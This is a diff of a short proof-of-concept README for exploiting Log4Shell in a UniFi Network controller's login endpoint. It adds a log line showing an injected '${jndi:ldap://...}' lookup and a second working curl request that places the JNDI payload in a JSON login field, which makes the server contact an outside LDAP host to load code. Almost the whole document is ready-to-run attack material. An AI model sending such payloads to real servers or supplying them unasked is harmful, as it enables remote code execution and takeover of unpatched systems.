@@ -6,7 +6,7 @@
 https://github.com/r3gistry/docker_unifi-network
 ```
 
-## Poc
+## Poc1
 
 ```
 POST /api/login HTTP/1.1
@@ -35,4 +35,16 @@ Connection: close
 }
 ```
 
+Logs
+
+```
+[2021-12-23T11:43:08,301] <webapi-15> WARN  sanitize - Pattern not matched, key:value "'remember':'${jndi:ldap://10.0.0.6:1270/lol}'" invalid
+```
+
 ![](1.jpeg)
+
+## Poc2
+
+```
+curl -vv --insecure -d '{"username":"admin","password":"lolwat","remember":true,"strict":"${jndi:ldap://10.0.0.6:1270/lol}"}' https://10.0.0.4:8443/api/login
+```
